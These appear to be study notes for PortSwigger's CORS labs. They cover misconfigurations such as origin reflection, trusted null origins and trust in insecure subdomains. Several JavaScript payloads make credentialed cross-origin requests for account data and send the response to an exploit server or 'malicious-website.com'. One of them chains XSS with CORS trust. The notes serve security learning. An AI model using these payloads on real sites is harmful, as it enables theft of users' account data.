# [Cross-origin resource sharing (CORS)](https://portswigger.net/web-security/cors)

## Lab

- apprentice:
  - [1. CORS vulnerability with basic origin reflection](./lab/1.%20CORS%20vulnerability%20with%20basic%20origin%20reflection.md)
  - [2. CORS vulnerability with trusted null origin](./lab/2.%20CORS%20vulnerability%20with%20trusted%20null%20origin.md)
- practitioner:
  - [3. CORS vulnerability with trusted insecure protocols](./lab/3.%20CORS%20vulnerability%20with%20trusted%20insecure%20protocols.md)

## Keywords

- CORS: Cross-origin resource sharing
- SOP: same origin policy
- ACAO: Access-Control-Allow-Origin

## Checklist for exam

- The `Access-Control-Allow-Credentials` header in response suggests that it may support CORS
- How the server creates the `Access-Control-Allow-Origin` header:
  - reflect any `Origin` header value?
  - null?
  - reflect `Origin` with all subdomains value?
  - ...

- payload:

  ```js
  <script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
      location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; 
    };
  </script>
  ```

## Summary

some vulnerabilities of CORS:

1. Server-generated ACAO header from client-specified `Origin` header:

    - [lab](./lab/1.%20CORS%20vulnerability%20with%20basic%20origin%20reflection.md)
    - payload:

      ```js
      <script>
      var req = new XMLHttpRequest();
      req.onload = reqListener;
      req.open('get','https://id.web-security-academy.net/accountDetails',true);
      req.withCredentials = true;
      req.send();

      function reqListener() {
        location='https://exploit-id.exploit-server.net/log?key='+this.responseText;
      };
      </script>
      ```

2. Errors parsing Origin headers:

    - whitelist:
      - allow access from all their subdomains (including future subdomains not yet in existence)
      - allow access from various other organizations' domains including their subdomains
    - whitelist problems:
      - often implemented by matching URL prefixes or suffixes, or using regular expressions. Any mistakes in the implementation can lead to access being granted to unintended external domains.
      - example: `normal-website.com`
        - `hackersnormal-website.com` => ok
        - `normal-website.com.evil-user.net` => ok

3. Whitelisted null `origin` value:
    - [lab](./lab/2.%20CORS%20vulnerability%20with%20trusted%20null%20origin.md)
    - Browsers might send the value null in the `Origin` header in various unusual situations:

      - Cross-origin redirects.
      - Requests from serialized data.
      - Request using the file: protocol.
      - Sandboxed cross-origin requests.
    - sandboxed payload:

      ```js
      <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
      var req = new XMLHttpRequest();
      req.onload = reqListener;
      req.open('get','vulnerable-website.com/sensitive-victim-data',true);
      req.withCredentials = true;
      req.send();

      function reqListener() {
      location='malicious-website.com/log?key='+this.responseText;
      };
      </script>"></iframe>
      ```

4. Exploiting XSS via CORS trust relationships:
    - [lab](./lab/3.%20CORS%20vulnerability%20with%20trusted%20insecure%20protocols.md)
    - exploit xss via CORS trust to retrieve sensitive information from the site that trusts the vulnerable application.
    - payload:

      ```js
      <script>
      document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
      </script>
      ```

5. Breaking TLS with poorly configured CORS
6. Intranets and CORS without credentials
